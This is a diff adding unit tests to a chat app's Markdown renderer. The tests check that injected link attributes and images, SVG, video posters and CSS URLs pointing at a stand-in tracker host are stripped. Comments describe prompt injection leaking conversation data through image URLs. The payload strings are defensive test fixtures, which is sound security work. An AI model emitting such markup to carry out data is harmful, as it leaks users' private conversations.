@@ -54,6 +54,37 @@ describe('MarkdownRenderer — sanitization (security floor)', () => {
   });
 });
 
+describe('MarkdownRenderer — Links und Bilder aus dem Modelltext (Paket 10)', () => {
+  // Audit 2026-10-10, M-6: `target`/`rel` überlebten DOMPurify (ADD_ATTR); ein
+  // eingeschleustes `rel="opener"` gab der neuen Seite den Zugriff auf das Fenster.
+  it('erzwingt noopener, sobald ein Link ein Ziel hat — auch gegen ein mitgeliefertes rel', () => {
+    const r = new MarkdownRenderer(makeCtx());
+    for (const href of ['https://fremd.example/x', 'https://openeduhub.net/x']) {
+      const out = html(r.render(`<a href="${href}" target="_blank" rel="opener">x</a>`));
+      const a = new DOMParser().parseFromString(out, 'text/html').querySelector('a')!;
+      expect(a.getAttribute('rel')).toBe('noopener noreferrer');
+    }
+  });
+
+  // M-7: ein Bild lädt ohne Klick — seine Adresse kann Gesprächsinhalt nach außen
+  // tragen (Prompt-Injection über Seiten- oder Werkzeugtext).
+  it('lässt keine Bilder durch, weder als Markdown noch als HTML', () => {
+    const r = new MarkdownRenderer(makeCtx());
+    expect(html(r.render('![x](https://tracker.example/p.gif?d=geheim)'))).not.toContain('<img');
+    expect(html(r.render('<img src="https://tracker.example/p.gif">'))).not.toContain('<img');
+  });
+
+  it('lässt auch kein SVG-Bild, keine Medien und keine Stile mit Adresse durch', () => {
+    const r = new MarkdownRenderer(makeCtx());
+    const svg = html(r.render('<svg><image href="https://tracker.example/s.svg"/></svg>'));
+    expect(svg).not.toContain('tracker.example');
+    const stil = html(r.render('<span style="background:url(https://tracker.example/x)">a</span>'));
+    expect(stil).not.toContain('tracker.example');
+    expect(html(r.render('<video poster="https://tracker.example/v.jpg"></video>')))
+      .not.toContain('tracker.example');
+  });
+});
+
 describe('MarkdownRenderer — Render-Cache', () => {
   // Token-Streaming (Plan 2026-10-01, T17): vorläufiger Text ändert sich mit
   // jedem Rahmen. Durch den Cache (300 Einträge) schöbe er fertige Bubbles hinaus.
